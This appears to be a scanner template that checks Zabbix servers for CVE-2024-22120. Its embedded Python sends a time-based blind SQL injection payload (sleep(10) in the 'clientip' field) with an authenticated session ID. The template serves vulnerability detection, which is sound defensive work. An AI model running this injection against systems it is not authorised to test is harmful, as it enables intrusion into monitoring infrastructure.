code:
- engine:
  - py
  - python3
  matchers:
  - type: word
    words:
    - Vulnerable to CVE-2024-22120
  source: "import os, struct, socket\nfrom datetime import datetime\nhostname=os.getenv('HOST')\n\
    port=int(os.getenv('PORT'))\nsid=os.getenv('SID')\nhostid=os.getenv('HOSTID')\n\
    zbx_header = \"ZBXD\\x01\".encode()\nmessage_json = \"{\\\"request\\\": \\\"command\\\
    \", \\\"sid\\\": \\\"\" + sid + \"\\\", \\\"scriptid\\\": \\\"3\\\", \\\"clientip\\\
    \": \\\"' + (select sleep(10)) + '\\\", \\\"hostid\\\": \\\"\" + hostid + \"\\\
    \"}\"\nmessage_length = struct.pack('<q', len(message_json))\nmessage = zbx_header\
    \ + message_length + message_json.encode()\nbefore_query = datetime.now().timestamp()\n\
    s = socket.socket()\ns.connect((hostname,port))\ns.send(message)\nresponse = s.recv(1024)\n\
    s.close()\nafter_query = datetime.now().timestamp()\nresponsetime = after_query\
    \ - before_query\nif responsetime >= 10 and zbx_header in response:\n    print(\"\
    Vulnerable to CVE-2024-22120\")\n"
id: cve-2024-22120
info:
  author: CodeStuffBreakThings
  classification:
    cve-id: CVE-2024-22120
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H
    cvss-score: 9.1
  description: Zabbix server can perform command execution for configured scripts.
    After a command is executed, an audit entry is added to "Audit Log". Due to the
    "clientip" field not being sanitized, it is possible to inject SQL into "clientip"
    and exploit a time-based blind SQL injection vulnerability.
  name: Zabbix Server - Authenticated Time-Based Blind SQL injection
  reference:
  - https://support.zabbix.com/browse/ZBX-24505#/
  - https://github.com/W01fh4cker/CVE-2024-22120-RCE
  remediation: Fixed in versions 6.0.28rc1, 6.4.13rc1, 7.0.0beta2
  severity: critical
  tags: zabbix,sqli,cve,cve2024,cve-2024-22120
variables:
  HOST: '{{Host}}'
  HOSTID: '{{HOSTID}}'
  PORT: '{{Port}}'
  SID: '{{SID}}'
